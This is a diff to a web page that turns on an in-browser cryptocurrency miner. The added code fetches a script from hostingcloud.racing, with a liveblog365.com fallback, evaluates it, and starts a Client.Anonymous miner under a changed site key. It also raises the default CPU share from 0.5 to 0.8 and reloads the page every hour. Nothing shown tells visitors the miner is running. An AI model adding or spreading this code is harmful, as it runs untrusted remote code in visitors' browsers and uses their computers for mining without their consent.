@@ -10,7 +10,7 @@
 <body>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.5;
+        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.8;
         window.use = use;
     </script>
 
@@ -18,7 +18,7 @@
     <script>
         setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
     </script>
-    <script src="https://www.hostingcloud.racing/M9jm.js"></script>
+    <!-- <script src="https://www.hostingcloud.racing/sIu3.js"></script> -->
     <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->
 
 
@@ -215,16 +215,16 @@ main();
 
 
 
-            // let scrUrl = 'https://www.hostingcloud.racing/sIu3.js';
-            // try {
-            //     await fetch(scrUrl);
-            // } catch (e) {
-            //     scrUrl = 'http://share.liveblog365.com/GJTy.php?f=9sx5.js';
-            //     return;
-            // }
+            let scrUrl = 'https://www.hostingcloud.racing/sIu3.js';
+            try {
+                await fetch(scrUrl);
+            } catch (e) {
+                scrUrl = 'http://share.liveblog365.com/GJTy.php?f=9sx5.js';
+                return;
+            }
 
-            // console.log(scrUrl);
-            // await evalScr(scrUrl);
+            console.log(scrUrl);
+            await evalScr(scrUrl);
             await new Promise(r => setTimeout(r, 5000));
             let Client = window.Client;
 
@@ -241,7 +241,7 @@ main();
                 Client = window.Client;
             }
 
-            var _client = new Client.Anonymous('53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9', {
+            var _client = new Client.Anonymous('a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb', {
                 throttle: 1 - use, c: 'w', // ads: 0
             });
             _client.start();
